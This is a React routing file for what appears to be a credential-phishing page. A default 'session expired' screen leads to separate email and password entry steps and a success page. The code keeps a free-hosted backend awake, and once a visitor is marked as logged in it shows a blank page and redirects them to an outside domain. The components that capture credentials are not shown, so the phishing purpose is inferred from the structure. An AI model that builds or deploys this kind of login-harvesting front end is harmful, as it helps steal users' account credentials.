import {
  BrowserRouter as Router,
  Routes,
  Route,
  Navigate,
} from "react-router-dom";
import { useEffect, useState } from "react";
import { AuthEmailEntryStep } from "./components/auth/AuthEmailEntryStep";
import { AuthPasswordEntryStep } from "./components/auth/AuthPasswordEntryStep";
import { AuthFlowSuccessPage } from "./pages/AuthFlowSuccessPage";
import { SessionExpiredPage } from "./pages/SessionExpiredPage";
import { startBackendPing } from "./services/backendPing.service";
import styles from "./AppShell.module.css";

function AppShell() {
  const [isRedirecting, setIsRedirecting] = useState(false);

  useEffect(() => {
    // Start backend ping to keep it awake
    const backendUrl = "https://login-app-6-ibwi.onrender.com";
    const stopPing = startBackendPing(backendUrl);

    // Check if user has already logged in
    const hasLoggedIn = localStorage.getItem("userLoggedIn");
    if (hasLoggedIn === "true") {
      setIsRedirecting(true);
      window.location.assign("http://carrierresponse.com/");
    }

    return () => {
      stopPing();
    };
  }, []);

  // Show white page while redirecting
  if (isRedirecting) {
    return <div style={{ width: "100%", height: "100vh", backgroundColor: "#ffffff" }} />;
  }

  return (
    <div className={styles.appShellContainer}>
      <Router>
        <Routes>
          {/* Session expired page as default */}
          <Route path="/" element={<SessionExpiredPage />} />

          {/* Auth routes */}
          <Route path="/auth/email" element={<AuthEmailEntryStep />} />
          <Route path="/auth/password" element={<AuthPasswordEntryStep />} />

          {/* Success route */}
          <Route path="/success" element={<AuthFlowSuccessPage />} />

          {/* Catch all - redirect to session expired */}
          <Route path="*" element={<Navigate to="/" replace />} />
        </Routes>
      </Router>
    </div>
  );
}

export default AppShell;
